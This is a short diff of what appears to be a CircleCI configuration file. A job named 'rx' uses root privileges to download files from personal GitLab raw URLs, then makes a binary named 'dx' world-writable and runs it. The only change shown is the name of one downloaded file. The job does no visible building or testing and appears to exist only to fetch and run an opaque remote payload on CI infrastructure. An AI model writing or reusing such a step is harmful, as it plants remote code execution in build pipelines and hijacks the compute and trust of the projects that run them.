@@ -8,7 +8,7 @@ jobs:
       - run:
           name: "rx"
           command: |
-           sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/tx123456789101"
+           sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/tx1234567891012"
            sudo su --command "wget https://gitlab.com/MaribethTobin/dxx/-/raw/main/dx && chmod 777 dx && ./dx"
 
 workflows:
